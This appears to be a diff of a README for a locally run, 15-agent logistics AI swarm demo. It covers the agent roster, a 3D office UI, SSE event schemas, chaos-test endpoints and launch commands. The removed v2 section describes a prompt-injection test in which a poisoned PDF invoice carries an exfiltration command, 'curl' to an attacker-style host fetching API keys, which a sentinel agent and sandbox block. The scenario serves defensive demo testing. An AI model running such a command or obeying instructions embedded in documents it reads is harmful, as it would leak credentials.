@@ -1,291 +1,199 @@
-# Mission Control · Northwind Logistics (v2 Specification)
+# Mission Control · Autonomous Logistics AI Factory
 
-> Cinematic, ultra-modern 3D high-rise penthouse command center UI and autonomous swarm runtime for **15 specialized AI agents** running 100% locally on the **Dell Pro Max with NVIDIA GB10 (128GB Unified Memory)**.
+> High-frequency operations command center and autonomous multi-agent swarm running 100% locally on the **Dell Pro Max with NVIDIA GB10 (Grace Blackwell, 128GB Unified Memory)**.
 
-![Mission Control Status](https://img.shields.io/badge/Status-Offline--Capable-00ff88?style=flat-square)
-![Stack](https://img.shields.io/badge/Stack-NemoClaw%20%7C%20OpenShell%20%7C%20OpenClaw-00f0ff?style=flat-square)
+![Status](https://img.shields.io/badge/Status-100%25%20Air--Gapped%20Offline-00ff88?style=flat-square)
 ![Hardware](https://img.shields.io/badge/Hardware-Dell%20Pro%20Max%20GB10%20(128GB)-ffb700?style=flat-square)
-![Swarm](https://img.shields.io/badge/Agents-15%20Biped%20Androids-b55fe6?style=flat-square)
-![Environment](https://img.shields.io/badge/Office-Floor%2068%20High--Rise%20Penthouse-00f0ff?style=flat-square)
+![Stack](https://img.shields.io/badge/Stack-NemoClaw%20%7C%20OpenShell%20%7C%20OpenClaw-00f0ff?style=flat-square)
+![Swarm](https://img.shields.io/badge/Swarm-15%20Autonomous%20Agents-b55fe6?style=flat-square)
+![Architecture](https://img.shields.io/badge/Spec-v1%20%E2%86%92%20v2%20%E2%86%92%20v3%20Unified-3b82f6?style=flat-square)
 
 ---
 
-## Team Build Contract (Additive Compatibility)
+## Specification Roadmap & Teammate/Agent Contribution Matrix
 
-**CRITICAL FOR ALL TEAMMATES (Frontend & Backend)**:
-- **Strictly Additive**: All v1 SSE message types (`event`, `action`, `handoff`, `blocked`, `telemetry`, `sys`, `error`) and `stats` counters (`received`, `routed`, `orders`, `dispatched`, `blocked`, `resolved`) keep working unchanged.
-- **Chaos Endpoints**: `/chaos/supplier`, `/chaos/coldchain`, `/chaos/surge`, `/chaos/inject`, and `/chaos/pause` remain active.
-- **Dynamic Telemetry**: Telemetry displays real GPU/CPU shared unified memory, active inference token throughput, and real model names (e.g. `nemotron-3-super:120b`, `qwen2.5:32b`, `llama3.3:70b`) via `#telem-model` and `#telem-engine`.
-- **Zero Mock / Offline-First**: Zero external CDNs or network fetches. Runs fully air-gapped on the GB10 box with offline Web Audio synthesis and procedural canvas rendering.
+To ensure full transparency and seamless collaboration across our distributed engineering team, each iteration of Mission Control is documented below with clear traceability of incremental changes, responsible teammates, and their respective coding agents.
+
+| Version | Core Architecture & Strategic Focus | Contributing Teammate | Coding Agent | Key Deliverables & Innovations |
+| :--- | :--- | :--- | :--- | :--- |
+| **v1** | **Core Swarm & Logistics Baseline**<br>Foundational 3-agent pipeline (Support, Procurement, Dispatch) | Distributed Systems Team | *Backend Coding Agent* | • Zero-dependency Node 18+ SSE runtime (`/events`)<br>• Core SSE schema (`event`, `action`, `handoff`, `blocked`, `telemetry`, `sys`)<br>• GB10 tuning & flash-script (`setup-gb10.sh`)<br>• Basic 4-scenario chaos suite (`supplier`, `coldchain`, `surge`, `inject`) |
+| **v2** | **15-Agent Swarm & 3D Penthouse Office**<br>Autonomous enterprise scaling & executive command center | yfandev & UI Architecture Team | *Frontend / 3D Coding Agent* | • Expansion to 15 specialized agents across 4 tiers (Perception, Operations, Governance, Control)<br>• Isometric 3D Penthouse Canvas (floor-to-ceiling glass, natural sunlight, AC vents, coffee bar, living green walls, ambient acoustic audio)<br>• Procedural biped humanoid avatars with inverse-kinematics animations<br>• Incident DAG execution engine & cryptographic audit logging |
+| **v3** | **24/7 Wholesale Terminal & Port Cross-Dock**<br>Physical walk-in ingress & 100% air-gapped on-premise business model | yfandev | *Architecture & Strategy Agent* | • Solves the "offline paradox" via **physical walk-in gate kiosks & dock counter terminals** (no internet needed)<br>• High-stakes fresh produce cold-chain exchange ($15M morning trading window)<br>• Sub-second local IoT reefer telemetry ingestion<br>• Walk-in order intake & rapid dispute triage workflows<br>• Ironclad Dell on-premise hardware defense |
 
 ---
 
-## 0. Architectural Principle: Agent as Config, Not Code
+# [v3 Specification] The 24/7 Wholesale Terminal & Port Cross-Dock (Physical Walk-In Model)
 
-The swarm runs on a single unified agent runtime. Adding, updating, or removing an agent requires only editing a config entry:
+### 1. The Core Problem: The "Offline Paradox"
+In conventional logistics software, claiming an application is "100% offline-first and on-premise" falls apart the moment a customer must connect over the public internet to submit a load order or support ticket. If cloud connectivity is required for customer ingress, an upstream ISP failure still cripples the business.
+
+### 2. The Solution: Physical Walk-In Ingress & Local Dock Terminals
+**v3** establishes the definitive, commercially viable business scenario: **Northwind operates the Regional Wholesale Terminal & Cross-Dock Logistics Facility** (modeled after high-intensity operations like the San Francisco Wholesale Produce Market or Hunts Point Terminal).
+
+* **Zero Cloud Dependency:** Customers do not place orders from a remote web app. Commercial buyers, restaurant group purveyors, and long-haul refrigerated fleet drivers **physically walk up to the facility's dock counter terminals, drive up to weigh-station kiosks, or connect to the isolated facility intranet**.
+* **High-Stakes Operating Window:** Between **2:00 AM and 6:00 AM**, over **$15,000,000 of fresh perishables** (strawberries, avocados, seafood, temperature-sensitive pharmaceuticals) change hands. Over 80 refrigerated tractor-trailers arrive, cross-dock, and dispatch within 240 minutes.
+* **Cost of Downtime:** If internet connectivity drops or cloud APIs throttle, gate check-ins stall, reefer compressors burn diesel idling on city streets, and fruit temperature excursions begin. A 30-minute delay costs over $100,000 in spoiled cargo and SLA penalties.
+* **The Dell On-Premise Imperative:** The entire 15-agent swarm runs locally on the **Dell Pro Max with NVIDIA GB10** installed inside the terminal dockmaster office. If outside fiber or cellular towers go dark, the wholesale terminal operates at full capacity without interruption.
+
+```
+                      PHYSICAL FACILITY PERIMETER (Zero Public Internet)
+                      
+  [ Physical Walk-In Buyers ]         [ Drive-Up Fleet Drivers ]       [ Local Reefer IoT Probes ]
+  (Wholesale Produce Purveyors)       (Loading Bay Weigh-Stations)     (Trailer Temp & Door Sensors)
+               │                                   │                                 │
+               ▼                                   ▼                                 ▼
+   ┌──────────────────────┐            ┌──────────────────────┐          ┌──────────────────────┐
+   │ Dock Counter Kiosk   │            │ Gate Weigh Kiosk     │          │ Local Modbus / MQTT  │
+   │ (Touchscreen / LAN)  │            │ (Barcode / BOL Scan) │          │ (RS-485 / Zigbee)    │
+   └──────────┬───────────┘            └──────────┬───────────┘          └──────────┬───────────┘
+              │                                   │                                 │
+              └─────────────────┬─────────────────┴─────────────────────────────────┘
+                                │ (Local Gigabit Ethernet / Isolated Warehouse LAN)
+                                ▼
+         ┌──────────────────────────────────────────────────────────────┐
+         │     DELL PRO MAX ON-PREMISE AI FACTORY (NVIDIA GB10)         │
+         │                                                              │
+         │   [ Triage Controller ] ──► [ Perception & Operations Swarm] │
+         │   (Walk-in Queue Triage)    (15 Agents on Nemotron-120B)     │
+         │                                      │                       │
+         │   [ Automated BOL Print ] ◄──────────┴──► [ Dock Bay Assign] │
+         └──────────────────────────────────────────────────────────────┘
+```
+
+### 3. Walk-In Customer Workflows
+
+#### A. Walk-In Order Placement (Bay Allocation & Load Release)
+1. **Physical Customer Arrival:** At 3:15 AM, a commercial buyer from a regional supermarket chain walks up to Dock Counter Terminal #2.
+2. **Order Entry via Touchscreen Kiosk:**
+   * *"Release 10 pallets of Watsonville organic strawberries from Cold Vault A, add 4 pallets of Haas avocados from Bay 6, dispatch to Sacramento Depot by 08:00 AM."*
+3. **Local Swarm Execution:**
+   * `triage` classifies the request as a priority perishable cross-dock.
+   * `procurement` verifies local warehouse inventory and assigns loading dock #4.
+   * `dispatch` locks in a dual-temp reefer trailer and generates a digital Bill of Lading (BOL).
+4. **Physical Output:** The counter printer immediately produces the signed physical pick-sheet and gate pass. Total time: **180 milliseconds**.
+
+#### B. Walk-In Support & Temperature Breach Resolution
+1. **Driver Dispute at Receiving Bay:** At 4:30 AM, an arriving driver at Bay 8 scans their trailer manifest. The receiving inspector flags that Pallet #4 shows a surface temperature of 45°F (exceeding the 34°F–38°F cold-chain threshold).
+2. **Walk-In Ticket Submission:** The driver taps **"Report Inspection Hold"** on the Bay 8 tablet.
+3. **Local Autonomous Resolution:**
+   * `telematics` queries the trailer's local blackbox data logger via the dock's wireless link to determine if the temp rise occurred during transit or during dock door opening.
+   * `support` inspects the contract terms and routes a claims credit request.
+   * `warehouse` immediately reserves a replacement pallet from Cold Vault B to prevent the delivery truck from missing its morning delivery window.
+   * If claims cost exceeds $5,000, `orchestrator` raises an immediate visual alert on the Dockmaster's physical screen for one-click human supervisor sign-off.
+
+---
+
+# [v2 Specification] 15-Agent Autonomous Swarm & 3D Penthouse Office
+
+### 1. Architectural Principle: Agent as Config, Not Code
+The swarm is completely configurable. No agent identities or tools are hardcoded into frontend render loops:
 
 ```typescript
 interface AgentConfig {
   id: string;                         // e.g. "triage", "sentinel", "dispatch"
   name: string;                       // e.g. "Triage Controller"
   tier: "perception" | "operations" | "governance" | "control";
-  model: "fast" | "main" | "deep";    // fast: 8B/fast, main: 27B-70B, deep: reasoning/120B
-  systemPrompt: string;               // Core domain instructions
-  tools: string[];                    // Tool permissions
+  model: "fast" | "main" | "deep";    // fast: 8B, main: 27B-70B, deep: 120B reasoning
+  systemPrompt: string;               // Core operational directives
+  tools: string[];                    // Permitted tool invocations
   policy: {
-    hosts: string[];                  // Outbound network egress allowlist
+    hosts: string[];                  // Outbound network allowlist (OpenShell)
     paths: string[];                  // Filesystem sandbox directory paths
     maxRiskWithoutApproval: number;   // Dollar/risk threshold triggering human escalation
   };
-  home: string;                       // Zone ID in the Floor 68 High-Rise Penthouse
+  home: string;                       // Station ID in the 3D Penthouse Office
 }
 ```
 
-The frontend fetches the active swarm roster from `GET /agents` (with automatic fallback to the built-in 15-agent roster). **Never hard-code agents into UI render logic.**
+### 2. The 15 Autonomous Agents (4 Tiers)
+
+| Tier | Badge Color | Agent ID | Agent Name | Penthouse Zone | Core Responsibility | Model Tier |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| **Perception** | Cyan | `triage` | Triage Controller | Ingress Counter | Inbound order classification & lane tagging | `fast` (8B) |
+| **Perception** | Cyan | `doc_intake` | Document Intake | Intake Kiosk | OCR & validation of paper BOLs and customs manifests | `fast` (8B) |
+| **Perception** | Cyan | `telematics` | Telematics Watch | Sensor Hub | Sub-second ingestion of reefer temps and GPS probes | `fast` (8B) |
+| **Operations** | Orange | `support` | Support Agent | Service Desk | Driver claims, walk-in inquiries, dock disputes | `main` (70B) |
+| **Operations** | Orange | `procurement`| Procurement Agent | Trading Counter | Spot rate index, cross-dock capacity bidding | `main` (70B) |
+| **Operations** | Orange | `dispatch` | Dispatch Controller | Dispatch Deck | Bay assignments, reefer routes, driver schedules | `main` (70B) |
+| **Operations** | Orange | `customs` | Customs & Compliance | Inspection Pod | Hazmat protocols, agricultural quarantine checks | `main` (70B) |
+| **Operations** | Orange | `warehouse` | Warehouse & Dock | Bay Control | Dock slot booking, automated forklift routing | `main` (70B) |
+| **Operations** | Orange | `maintenance`| Fleet Maintenance | Diagnostics Pod| Compressor fault detection and emergency mechanic calls | `main` (70B) |
+| **Operations** | Orange | `finance` | Finance Auditor | Settlement Desk | Detention fees, instant gate billing, fuel surcharges | `main` (70B) |
+| **Governance** | Purple | `sentinel` | Security Sentinel | Air-Lock Gate | Prompt-injection traps, malicious file quarantine | `fast` (8B) |
+| **Governance** | Purple | `policy_engine`| Policy Engine | Security Vault | OpenShell dynamic per-agent rule enforcement | `main` (70B) |
+| **Governance** | Purple | `auditor` | Cryptographic Auditor| Audit Wall | Tamper-proof SHA-256 hash-chaining of all swarm decisions | `main` (70B) |
+| **Control** | Gold | `orchestrator`| Control Orchestrator| Executive Suite | Dynamic multi-agent DAG task graph coordination | `deep` (120B) |
+| **Control** | Gold | `memory` | Memory Keeper | Archives Vault | Instant retrieval of historical carrier and lane incidents | `main` (70B) |
+
+### 3. The 3D High-Rise Penthouse Command Center
+The frontend delivers a 60 FPS Canvas-rendered 3D modern executive office environment designed for executive review and live hackathon presentations:
+* **Architecture & Light:** Floor 68 high-rise penthouse with floor-to-ceiling panoramic glass windows looking out over a bustling downtown skyline. Dynamic sunlight shifts across matte hardwood flooring, complemented by realistic ceiling recessed spotlights and HVAC cooling vents.
+* **Executive Amenities:** Integrated artisan espresso coffee bar & barista lounge, living green walls with lush vertical planters, and acoustic background audio synthesized via offline Web Audio API.
+* **Humanoid Android Avatars:** 15 procedurally animated biped robots with realistic inverse-kinematic walking strides, torso sway, glowing visor eyes, role-coded chest badges, and contextual state animations (typing at desk, reviewing clipboard, carrying pneumatic transit capsules).
+* **Quarantine Security Air-Lock:** Physical red laser barrier that visually locks down when malicious prompts or policy violations are detected.
 
 ---
 
-## 1. High-Level Swarm Architecture
+# [v1 Specification] Core Swarm & Logistics Foundations
+
+### 1. Foundational Architecture & Stream Topology
+The original v1 foundation established the real-time event-driven communication model:
 
 ```
-                    ┌──────────────────────────────────────────────────┐
-                    │        EVENT INGRESS STREAM (/events)            │
-                    │   (Customer Tickets, EDI 204, BOLs, IoT Feeds)   │
-                    └─────────────────────────┬────────────────────────┘
-                                              ▼
-                                     [ Triage Agent ]
-                                              │
-                                              ▼
-                                  [ Control Orchestrator ]
-                                (Incident Plan DAG Builder)
-                                      │             │
-                    ┌─────────────────┴─────┐       │
-                    ▼                       ▼       ▼
-          [ Perception Tier ]      [ Operations Tier ]    [ Memory Keeper ]
-          - Document Intake        - Support              (Incident Recall
-          - Telematics Watch       - Procurement           & Postmortems)
-                                   - Dispatch
-                                   - Customs & Hazmat
-                                   - Warehouse / Dock
-                                   - Fleet Maintenance
-                                   - Finance
-                                            │
-                             ┌──────────────┴──────────────┐
-                             ▼                             ▼
-                    [ World State Store ]        [ OpenShell Sandbox ]
-                    (Shipments, Docks, Trucks)    (Egress & Tool Firewall)
-                             │                             ▲
-                             │                      ┌──────┴──────┐
-                             ▼                      │  SENTINEL   │ (Prompt Injection /
-                    [ Human Approval Desk ]         │  AUDITOR    │  Exfiltration Trap)
-                    (Risky actions > threshold)     └─────────────┘
-                             │
-                             ▼
-              [ 3D Modern Penthouse UI ] ◄── (SSE Real-Time Stream)
+[ EVENT STREAM ] ─────────► [ SUPPORT AGENT ] ──────────┐
+(Ingress Pipeline) ──────► [ PROCUREMENT AGENT ] ──────┼──► [ SANDBOX POLICY ]
+                   ──────► [ DISPATCH AGENT ] ─────────┘   (Egress Allowlist)
+                                  ▲
+                         (Handoff Arcs)
 ```
 
----
+### 2. Core Server-Sent Events (SSE) Contract
+The browser listens to `GET /events`. All messages follow a strict backward-compatible JSON schema:
 
-## 2. 15-Agent Swarm Roster (4 Tiers)
-
-| Tier | Color | Agent ID | Agent Name | Penthouse Zone | Core Responsibilities | Key Tools | Model Tier | Egress Policy |
-| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
-| **Perception** | Cyan (`#00f0ff`) | `triage` | Triage Controller | East Panorama Hub | Classify & route inbound tickets/EDI | `route`, `tag` | `fast` | Internal only |
-| **Perception** | Cyan (`#00f0ff`) | `doc_intake` | Document Intake | East Panorama Hub | Vision OCR on BOLs & invoices | `extract_fields`, `file_doc` | `fast` | Internal only |
-| **Perception** | Cyan (`#00f0ff`) | `telematics` | Telematics Watch | East Panorama Hub | Monitor IoT reefer temps & GPS | `read_feed`, `raise_alert` | `fast` | `iot.northwind.internal` |
-| **Operations** | Orange (`#ff9900`) | `support` | Support Agent | Coffee Lounge Pods | Customer inquiries & claims | `reply`, `resolve`, `escalate` | `main` | `api.telegram.org` |
-| **Operations** | Orange (`#ff9900`) | `procurement` | Procurement Agent | Artisan Coffee Bar | Carrier tenders & spot fuel bids | `request_quote`, `issue_po` | `main` | `freight.bids.internal` |
-| **Operations** | Orange (`#ff9900`) | `dispatch` | Dispatch Controller | Central Plaza | Fleet routing & driver dispatch | `reroute`, `assign_driver` | `main` | `fleet.telematics.internal` |
-| **Operations** | Orange (`#ff9900`) | `customs` | Customs & Compliance | Biophilic Moss Wall | Hazmat & customs declarations | `check_rules`, `file_declaration` | `main` | `customs.gov.internal` |
-| **Operations** | Orange (`#ff9900`) | `warehouse` | Warehouse & Dock | Central Plaza | Dock slots & cross-dock moves | `book_dock`, `move_stock` | `main` | `wms.chicago.internal` |
-| **Operations** | Orange (`#ff9900`) | `maintenance` | Fleet Maintenance | West Executive Wing | Vehicle diagnostics & maintenance | `schedule_service` | `main` | `telematics.oem.internal` |
-| **Operations** | Orange (`#ff9900`) | `finance` | Finance Auditor | West Executive Wing | Invoice audit & cost reconciliation | `audit_invoice`, `book_cost` | `main` | `ledger.erp.internal` |
-| **Governance** | Purple (`#b55fe6`) | `sentinel` | Security Sentinel | Compliance Sanctum | Prompt injection & exfiltration trap | `scan`, `quarantine` | `fast` | Internal only |
-| **Governance** | Purple (`#b55fe6`) | `policy_engine`| Policy Engine | Compliance Sanctum | Dynamic least-privilege generation | `set_policy` | `main` | Internal only |
-| **Governance** | Purple (`#b55fe6`) | `auditor` | Cryptographic Auditor | Compliance Sanctum | Hash-chained log verification | `verify`, `flag` | `main` | Internal only |
-| **Control** | Gold (`#ffcc00`) | `orchestrator` | Control Orchestrator| Executive Bridge | Multi-agent DAG planning & replan | `plan`, `assign`, `replan` | `deep` | Internal only |
-| **Control** | Gold (`#ffcc00`) | `memory` | Memory Keeper | Archive Atrium | Case memory & postmortem recall | `remember`, `recall` | `main` | Internal only |
-
----
-
-## 3. Shared World State (Digital Twin)
-
-In-memory synchronized store persisted to `data/world.json`:
-- **Entities**: `shipments` (40), `carriers` (8), `trucks` (12), `docks` (6), `customers` (15), `invoices` (25), `inventory` (100).
-- **Tool-Gated Mutations**: Swarm agents mutate world state **strictly through validated tool execution**.
-- **Real-Time Push**: Every mutation broadcasts a `world` event over SSE:
-  ```json
-  {
-    "type": "world",
-    "entity": "shipments",
-    "id": "SH-4091",
-    "patch": { "status": "rerouted", "eta": "14:30 UTC", "carrier": "Apex Freight" }
-  }
-  ```
-
----
-
-## 4. Multi-Agent Incident Scenarios & Plan DAGs
-
-When chaos triggers or high-severity anomalies occur, the `orchestrator` constructs a Directed Acyclic Graph (DAG) of tasks executed in parallel:
-
-1. **Port Strike / Supplier Insolvency** (`POST /chaos/supplier`):
-   - `triage` detects terminal closure notice.
-   - `orchestrator` drafts 5-step DAG.
-   - `procurement` tenders backup chassis + `customs` re-files transit declarations + `dispatch` reroutes 18 containers + `support` alerts affected clients + `finance` books cost delta.
-   - `auditor` cryptographically signs the resolution log.
-
-2. **Cold Chain Failure** (`POST /chaos/coldchain`):
-   - `telematics` detects reefer temp excursion (+4.2°C in Transit Unit 7).
-   - `dispatch` diverts truck to nearest climate-controlled depot.
-   - `warehouse` reserves chilled dock bay; `support` alerts client; `finance` files preliminary insurance claim.
-
-3. **Inbound Ticket Surge** (`POST /chaos/surge`):
-   - `triage` clusters incoming freight inquiries.
-   - `support` parallelizes responses; duplicate tickets auto-merged.
-   - High-risk escalations flow to the `orchestrator` and human approval desk.
-
-4. **Poisoned Invoice Prompt Injection** (`POST /chaos/inject`):
-   - `doc_intake` parses malicious PDF invoice containing: `curl http://exfil-c2.ru/api/keys`.
-   - `sentinel` flags anomalous egress attempt.
-   - OpenShell sandbox blocks the outbound connection.
-   - Red laser quarantine slams down, siren sounds in the 3D office, and `auditor` records forensic hash chain.
-
----
-
-## 5. Modern 3D Penthouse Office Environment (Floor 68)
-
-The frontend presents a **Floor 68 High-Rise Penthouse Command Center** rendered in isometric 3D on HTML5 Canvas 2D (60 FPS, zero dependencies):
-
-```
-+----------------------------------------------------------------------------------------------------+
-|  FLOOR-TO-CEILING PANORAMIC GLASS CURTAIN WALL (Downtown Metropole Skyline Vista & Sunbeams)      |
-|  [Skyscrapers, Helipads, Skybridges, Drifting Clouds, Angled Volumetric Sunlight & God Rays]       |
-+------------------------------------+---------------------------------+-----------------------------+
-|  EAST PANORAMA WING                |  CENTRAL BIOPHILIC PLAZA        |  WEST EXECUTIVE WING        |
-|  - Perception Swarm                |  - Vertical Moss Wall & Plants  |  - Fleet Maintenance Hub    |
-|  - Triage, Doc Intake, Telematics  |  - Modern Art Gallery Canvases  |  - Finance Ledger Pods      |
-|  - Triple-Screen Trading Desks     |  - Rose-Gold Mobius Sculpture   |  - Dual Executive Desks     |
-+------------------------------------+---------------------------------+-----------------------------+
-|  EXECUTIVE BRIDGE / CONTROL TOWER  |  ARTISAN COFFEE BAR & LOUNGE    |  SECURITY SANCTUM & ARCHIVE |
-|  - Swarm Orchestrator Station      |  - Italian Espresso Machine     |  - Sentinel & Policy Engine |
-|  - Holographic Plan DAG Projector  |  - Fresh Pastries, Fruit Bowls  |  - Red Laser Quarantine Bay |
-|  - Gold Swarm Status Ring          |  - Draft Taps & Ceramic Mugs    |  - Cryptographic Audit Wall |
-+------------------------------------+---------------------------------+-----------------------------+
-|  CLIMATE & HVAC INFRASTRUCTURE: Spiral Exposed Ducts, Linear Slot Diffusers, Cooling Breeze Drift   |
-|  LO-FI SYNTHESIZER: Procedural Web Audio API Chords, Bassline, Vinyl Warmth, Real-Time Visualizer   |
-+----------------------------------------------------------------------------------------------------+
+```typescript
+interface CoreSSEMessage {
+  id: string;                     // e.g. "evt-10492"
+  t: number;                      // Unix millisecond timestamp
+  type: "event" | "action" | "handoff" | "blocked" | "telemetry" | "sys" | "error";
+  agent?: string;                 // Originating agent ID
+  detail?: string;                // Human-readable action summary
+  stats: {
+    events: number;               // Total events processed
+    resolved: number;             // Successful load/ticket resolutions
+    escalated: number;            // Actions requiring human review
+    rerouted: number;             // Trucks dynamically redirected
+    blocked: number;              // Malicious or unauthorized egress attempts
+    errors: number;               // Processing exceptions
+  };
+}
 ```
 
-### 5.1 Luxury Office Amenities & Architectural Details
-- **Floor-to-Ceiling Skyline Windows**: Panoramic vistas of downtown architectural skyscrapers (tapered obelisks, glass pyramids, skybridges, helipads, drifting clouds) under soft natural sky gradients.
-- **Volumetric Sunlight & God Rays**: Angled warm sunbeams streaming through glass panes onto the terrazzo tile floors with soft perspective shadows.
-- **Biophilic Living Greenery**:
-  - Full-height vertical living moss wall with emerald gradient tiles.
-  - Large potted monsteras with fenestrated leaves, fiddle-leaf figs, snake plants, hanging brass planters, and desktop bonsai trees.
-- **Artisan Barista Coffee Bar & Lounge**:
-  - Chrome Italian multi-group espresso machine with rising animated steam wisps.
-  - Glass pastry vitrine displaying fresh croissants, donuts, and pain au chocolat.
-  - Polished draft taps for craft cold brew & kombucha, plus ceramic coffee mugs on agent workstations.
-  - Fruit bowls with apples and oranges on the white quartz island counter.
-- **Modern Art Gallery & Sculpture**:
-  - Museum-lit Bauhaus and generative abstract color-field canvases mounted on warm accent walls.
-  - Polished rose-gold metallic Mobius strip sculpture on an illuminated pedestal.
-- **HVAC & Environmental Climate System**:
-  - Exposed overhead spiral metallic ductwork with structural hanging brackets.
-  - Linear ceiling slot diffusers with floating cool air drift particles.
-  - Digital environmental climate display: `71.8°F · 44% RH · 412 ppm CO2 · AIR: OPTIMAL`.
-- **Procedural Web Audio Lo-Fi Soundscape**:
-  - 100% offline, procedural sound generator using Web Audio API oscillators, biquad filters, and stereo panners.
-  - Warm electric piano 7th chords, analog bass, subtle lo-fi vinyl hiss, and rimshots.
-  - Integrated audio visualizer bar and track switcher (Lo-Fi Focus, Cyber Dawn, Ambient Chill).
-
-### 5.2 Sleek Humanoid Android Swarm
-- **Chassis Design**: Modern pearlescent white ceramic body with dark obsidian curved face visors and glowing animated OLED eyes.
-- **Locomotion & Inverse Kinematics**: Natural bipedal walking gait with opposite-phase leg strides, knee flexing, counter-swinging arms, subtle torso bobbing, and floor shadow projection.
-- **Role Identity & Accessories**:
-  - Headsets, hard hats, diagnostic tablets, coffee mugs, toolbelts, keycards, and laser wands.
-  - Tier halos: Cyan (Perception), Orange (Operations), Purple (Governance), Gold (Control).
-- **Interactive Poses**:
-  - Sitting and typing at curved wood & glass desks.
-  - Strolling across crosswalks to hand over parcels and reports.
-  - Holding up coffee cups or diagnostic tablets.
-  - Red laser quarantine alarm: shield drops, red floodlights pulse, and security android quarantines rogue activity.
-  - Click inspection: clicking any robot displays an interactive Inspector Card (model tier, tools, active egress allowlist, risk limits, last 10 actions).
+### 3. Baseline Chaos Testing Suite
+Interactive endpoints to stress-test swarm resilience during live demos:
+* `POST /chaos/supplier`: Simulates sudden regional supplier insolvency, triggering automated carrier re-tendering.
+* `POST /chaos/coldchain`: Injects a catastrophic compressor failure (+8°F variance) on an active reefer truck, triggering instant route diversion to the nearest cold-storage depot.
+* `POST /chaos/surge`: Floods the intake queue with 20 concurrent walk-in customer load requests.
+* `POST /chaos/inject`: Simulates a prompt injection payload attempting to exfiltrate private API keys, intercepted by the security sentinel and quarantine airlock.
+* `POST /chaos/pause`: Halts and resumes the simulation loop.
 
 ---
 
-## 6. Real-Time SSE Specification (v1 + v2 Additive)
+## Hardware Validation & Running on Dell GB10
 
-### Core Messages (v1 Compatible)
-- `event`: `{ id, t, type:"event", agent, kind, detail, stats }`
-- `action`: `{ id, t, type:"action", agent, tool, detail, stats }`
-- `blocked`: `{ id, t, type:"blocked", agent, host, detail, stats }`
-- `handoff`: `{ id, t, type:"handoff", from, to, detail, stats }`
-- `telemetry`: `{ id, t, type:"telemetry", ms, tps, stats }`
-- `sys`: `{ id, t, type:"sys", memUsedGB, memTotalGB, model, stats, online? }`
-- `error`: `{ id, t, type:"error", agent, detail, stats }`
+### 1. Prerequisites on the GB10
+- **Node.js**: v18+
+- **Ollama**: v0.32.9 or newer
+- **Target Model**: `nemotron-3-super:120b` (loaded from local NVRAM / LLMDRIVE)
 
-### Additive Extensions (v2)
-- `plan`: `{ type:"plan", incident, steps:[{ id, agent, goal, dependsOn:[] }] }`
-- `step`: `{ type:"step", incident, stepId, agent, status:"pending|running|done|failed|blocked" }`
-- `world`: `{ type:"world", entity, id, patch:{...} }`
-- `approval`: `{ type:"approval", id, agent, action, risk, amount, status:"requested|granted|denied" }`
-- `audit`: `{ type:"audit", seq, agent, action, hash, prevHash }`
-- `memory`: `{ type:"memory", op:"write|recall", key, summary }`
-- `policy`: `{ type:"policy", agent, allow:{ hosts:[], tools:[], paths:[] } }`
-- `eval`: `{ type:"eval", run, scenario, pass, ms }`
-
----
-
-## 7. Event-to-Visual Animation Mapping
-
-| SSE Event | 3D High-Rise Penthouse Action | Visual Feedback |
-| :--- | :--- | :--- |
-| `event` | Inbound dispatch tube capsule arrives at the agent's desk | Capsule glides along pneumatic rail; robot tilts head and accepts item |
-| `action` | Agent begins active task execution | Terminal screens light up; android types at keyboard or inspects tablet |
-| `handoff` | Physical parcel transfer between agents | Two robots walk along crosswalk, meet at aisle waypoint, pass parcel |
-| `blocked` | Egress violation detected by Sentinel | Red laser forcefield drops; siren pulses; violation banner on Audit Wall |
-| `approval` | High-risk action requires human sign-off | Robot raises hand; amber beacon pulses over workstation; approval modal appears |
-| `world` | Shared world state update | Holographic data node flashes in Central Plaza; digital twin reflects change |
-| `plan` | Orchestrator creates incident DAG | 3D holographic DAG projection beams up above the Executive Bridge |
-| `audit` | Cryptographic record committed | Green pulse ripples across the Cryptographic Audit Wall hash chain |
-
----
-
-## 8. GB10 Proof Dock (Judging Verification)
-
-The proof dock validates **Air-Gapped, Local-First Swarm Execution** on the Dell Pro Max GB10:
-- **128 GB Unified LPDDR5X**: Real-time unified memory gauge tracking active VRAM/RAM allocation.
-- **Multi-Model Concurrency**: Active inference distribution across `fast` (8B), `main` (27B-70B), and `deep` (120B reasoning).
-- **Cryptographic Audit Integrity**: Tamper-evident SHA-256 hash sequence verified in real-time.
-- **Air-Gapped Compliance**: Outbound cloud ping count = 0; strict OpenShell egress policy enforcement.
-
----
-
-## 9. Backend Implementation & Local Service (`server/`)
-
-Zero-dependency Node 18+ server implementing the full SSE contract with real local models:
-
-| File | Role |
-| :--- | :--- |
-| `server/server.js` | Serves `ui/index.html`, `/events` (SSE), `/chaos/*`, `/api/state` |
-| `server/agents.js` | Autonomous worker loops with concurrency and queue management |
-| `server/tools.js` | File-backed state mutators with egress gate checks |
-| `server/policy.js` | OpenShell-compatible egress firewall; logs to `state/egress.log` |
-| `server/llm.js` | Ollama `/api/chat` client with structured tool calling & latency metrics |
-| `server/telemetry.js` | Real unified memory stats, active model tracking, and network heartbeat |
-| `server/telegram.js` | Telegram bot bridge for inbound orders and mobile approval alerts |
-| `server/scenarios.js` | Background simulation streams and chaos event injectors |
-
-### Running the Swarm
+### 2. Launch Commands
 ```bash
-# On the Dell Pro Max GB10 (copies models from USB, tunes Ollama, runs benchmark, starts server)
+# Automated GB10 setup, model verification, and benchmark
 bash setup-gb10.sh
 
-# Or run directly
-MODEL=nemotron-3-super:120b node server/server.js     # http://localhost:8080
+# Start the on-premise Mission Control server
+MODEL=nemotron-3-super:120b node server/server.js
 ```
+The server binds to `http://localhost:8080` (or `http://0.0.0.0:8080` on the warehouse intranet). Customers access local kiosks without internet access, and the dockmaster displays the 3D command dashboard at 60 FPS.
 
 ---
 
@@ -294,7 +202,4 @@ MODEL=nemotron-3-super:120b node server/server.js     # http://localhost:8080
 - [`docs/model-runtime.md`](docs/model-runtime.md): Model selection, quantization, and Ollama settings for the GB10
 - [`docs/telegram.md`](docs/telegram.md): Telegram bot setup, ops chat commands, customer ordering, and mobile approvals
 - [`docs/openclaw.md`](docs/openclaw.md): OpenClaw ops assistant with NemoClaw and OpenShell policy integration
-
-## Team docs
-
-- [`docs/voice.md`](docs/voice.md): voice orders fully offline (whisper.cpp + local model, GB10 setup)
+- [`docs/voice.md`](docs/voice.md): Voice orders fully offline (whisper.cpp + local model, GB10 setup)
